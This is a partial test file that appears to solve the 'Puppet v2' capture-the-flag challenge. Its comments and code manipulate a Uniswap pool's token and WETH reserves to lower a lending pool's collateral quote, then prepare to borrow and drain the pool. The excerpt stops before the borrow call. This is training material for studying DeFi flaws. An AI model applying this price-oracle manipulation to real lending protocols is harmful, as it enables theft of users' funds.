...
describe("[Challenge] Puppet v2", function () {
    ...
    it("Execution", async function () {
        ...
        // quote = amountA.mul(reserveWETH) / reserveToken =>
        // reduce the WETH reserve & increase the token reserve from Uniswap pool to reduce the quote
        // call: swapExactTokensForETH => we add all our DVT to the Uniswap pool & take some WETH ot of the pool

        // we need to approve our tokens for the Uniswap router
        // then we swap all our DVT for ETH
        // then, we mint WETH from our ETH
        // we approve the required WETH amout for the lending Pool
        // we call "borrow" and drain the pool

        await token.connect(player).approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE)

        //we swap all out tokens for ETH => creates a larger token balance & a smaller ETH balance in the Uniswap pool
        await uniswapRouter
            .connect(player)
        ...
        //check the required ETH deposit
        let requiredETHDeposit = await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
        console.log("Required ETH deposit: ", requiredETHDeposit)

        console.log("My ETH balance: ", await ethers.provider.getBalance(player.address))

        //we need to mint WETH & approve the lending pool
        await weth.connect(player).deposit({ value: requiredETHDeposit })
        console.log("My WETH balance: ", await weth.balanceOf(player.address))
        await weth.connect(player).approve(lendingPool.address, requiredETHDeposit)
